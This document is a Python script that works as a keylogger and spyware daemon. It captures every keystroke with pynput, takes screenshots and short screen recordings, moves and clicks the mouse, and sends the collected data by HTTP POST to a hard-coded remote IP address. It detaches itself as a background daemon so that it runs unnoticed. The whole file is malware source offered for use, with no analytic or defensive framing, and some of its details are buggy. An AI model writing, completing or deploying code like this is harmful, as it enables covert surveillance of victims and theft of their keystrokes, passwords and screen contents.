# Python code

import json
import requests
from pynput import keyboard
import threading
from PIL import ImageGrab
import pyautogui
import time
import daemon

# Server address and port number
server_address = "http://3.143.237.202"  # Replace with your server's address
port_number = "8080"  # Replace with your server's port

# Set the time interval for code execution
time_interval = 10  # Adjust as needed

# Global variable to store keyboard data
keyboard_text = ""

def send_post_req(endpoint, data):
    try:
        payload = json.dumps(data)
        response = requests.post(f"{server_address}:{port_number}/{endpoint}", data=payload, headers={"Content-Type": "application/json"})
        print(f"Data sent to {endpoint}")
    except:
        print(f"Couldn't send data to {endpoint}")

def send_keyboard_data():
    send_post_req("keyboard_data", {"keyboardData": keyboard_text})
    keyboard_text = ""

def on_press(key):
    global keyboard_text

    if key == keyboard.Key.enter:
        keyboard_text += "\n"
    elif key == keyboard.Key.tab:
        keyboard_text += "\t"
    elif key == keyboard.Key.space:
        keyboard_text += " "
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.backspace and len(keyboard_text) == 0:
        pass
    elif key == keyboard.Key.backspace and len(keyboard_text) > 0:
        keyboard_text = keyboard_text[:-1]
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    elif key == keyboard.Key.esc:
        return False
    else:
        keyboard_text += str(key).strip("'")

def capture_screenshots():
    screenshot = ImageGrab.grab()
    screenshot.save("screenshot.png")
    send_post_req("screenshots", {"file": "screenshot.png"})
    print("Screenshot captured.")

def perform_screen_recording():
    duration = 5
    frames_per_second = 10
    num_frames = duration * frames_per_second

    for i in range(num_frames):
        screenshot = pyautogui.screenshot()
        screenshot.save(f"frame_{i}.png")
        send_post_req("screen_recordings", {"file": f"frame_{i}.png"})
        time.sleep(1 / frames_per_second)

    print("Screen recording completed.")

def perform_mouse_actions():
    pyautogui.moveTo(100, 100)
    pyautogui.click()
    screenshot = pyautogui.screenshot()
    screenshot.save("screenshot.png")
    send_post_req("mouse_actions", {"file": "screenshot.png"})
    pyautogui.screenshot("screen_recording.gif", duration=5)
    image_location = pyautogui.locateOnScreen("image.png")
    
    if image_location is not None:
        image_center = pyautogui.center(image_location)
        pyautogui.click(image_center)

def run_daemon():
    # Create a listener for keyboard events
    listener = keyboard.Listener(on_press=on_press)
    
    # Start the listener in a separate thread
    listener_thread = threading.Thread(target=listener.start)
    listener_thread.start()
    
    # Schedule sending keyboard data at regular intervals
    keyboard_data_thread = threading.Timer(time_interval, send_keyboard_data)
    keyboard_data_thread.start()
    
    # Schedule capturing screenshots at regular intervals
    screenshots_thread = threading.Timer(time_interval, capture_screenshots)
    screenshots_thread.start()
    
    # Schedule performing screen recordings at regular intervals
    screen_recordings_thread = threading.Timer(time_interval, perform_screen_recording)
    screen_recordings_thread.start()
    
    # Schedule performing mouse actions at regular intervals
    mouse_actions_thread = threading.Timer(time_interval, perform_mouse_actions)
    mouse_actions_thread.start()

# Create a daemon context
with daemon.DaemonContext():
    run_daemon()
